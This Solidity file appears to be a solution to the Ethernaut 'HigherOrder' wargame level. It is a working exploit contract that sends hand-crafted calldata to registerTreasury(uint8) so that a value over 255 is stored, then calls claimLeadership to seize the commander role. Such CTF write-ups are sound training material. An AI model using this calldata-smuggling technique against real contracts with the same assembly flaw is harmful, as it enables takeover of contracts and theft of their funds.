// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title HigherOrderAttack
 * @notice Exploit contract for Ethernaut Level 30 - HigherOrder
 * 
 * VULNERABILITY:
 * The HigherOrder contract has a function registerTreasury(uint8) that uses assembly
 * to read calldata. While the function signature says uint8 (max 255), the assembly 
 * code reads a full 32 bytes from calldata, allowing us to set treasury > 255.
 * 
 * EXPLOIT STRATEGY:
 * 1. The registerTreasury function expects uint8 (0-255)
 * 2. But assembly code: sstore(treasury_slot, calldataload(4))
 * 3. calldataload(4) reads 32 bytes, not 1 byte!
 * 4. We craft calldata with value > 255 to bypass the restriction
 * 5. Call claimLeadership() to become commander
 */

interface IHigherOrder {
    function registerTreasury(uint8) external;
    function claimLeadership() external;
    function treasury() external view returns (uint256);
    function commander() external view returns (address);
}

contract HigherOrderAttack {
    IHigherOrder public target;
    
    event TreasuryRegistered(uint256 value);
    event LeadershipClaimed(address commander);
    
    constructor(address _target) {
        require(_target != address(0), "Invalid target address");
        target = IHigherOrder(_target);
    }
    
    /**
     * @notice Execute the complete attack
     * @dev This function performs the attack in two steps:
     *      1. Call registerTreasury with crafted calldata (value > 255)
     *      2. Call claimLeadership to become commander
     */
    function attack() external {
        // Step 1: Register treasury with value > 255 using low-level call
        // We craft calldata manually to bypass the uint8 restriction
        
        // Function selector for registerTreasury(uint8)
        bytes4 selector = bytes4(keccak256("registerTreasury(uint8)"));
        
        // We want to set treasury to 256 (or any value > 255)
        uint256 treasuryValue = 256;
        
        // Craft the calldata: selector + value (as uint256, not uint8)
        bytes memory data = abi.encodePacked(selector, treasuryValue);
        
        // Make low-level call with crafted calldata
        (bool success,) = address(target).call(data);
        require(success, "Treasury registration failed");
        
        emit TreasuryRegistered(treasuryValue);
        
        // Step 2: Claim leadership
        target.claimLeadership();
        
        emit LeadershipClaimed(target.commander());
    }
    
    /**
     * @notice Alternative attack method - register treasury only
     * @param value The value to register (must be > 255)
     */
    function registerTreasuryExploit(uint256 value) external {
        require(value > 255, "Value must be greater than 255");
        
        // Function selector for registerTreasury(uint8)
        bytes4 selector = bytes4(keccak256("registerTreasury(uint8)"));
        
        // Craft the calldata with full uint256 value
        bytes memory data = abi.encodePacked(selector, value);
        
        // Make low-level call
        (bool success,) = address(target).call(data);
        require(success, "Treasury registration failed");
        
        emit TreasuryRegistered(value);
    }
    
    /**
     * @notice Claim leadership after treasury is set
     */
    function claimLeadership() external {
        target.claimLeadership();
        emit LeadershipClaimed(target.commander());
    }
    
    /**
     * @notice Check current state of the target contract
     */
    function checkState() external view returns (
        uint256 treasury,
        address commander,
        bool canClaim
    ) {
        treasury = target.treasury();
        commander = target.commander();
        canClaim = treasury > 255;
    }
    
    /**
     * @notice Get the function selector for registerTreasury
     */
    function getRegisterTreasurySelector() external pure returns (bytes4) {
        return bytes4(keccak256("registerTreasury(uint8)"));
    }
    
    /**
     * @notice Demonstrate how to craft the malicious calldata
     * @param value The value to encode (should be > 255)
     * @return The crafted calldata
     */
    function craftMaliciousCalldata(uint256 value) external pure returns (bytes memory) {
        bytes4 selector = bytes4(keccak256("registerTreasury(uint8)"));
        return abi.encodePacked(selector, value);
    }
}
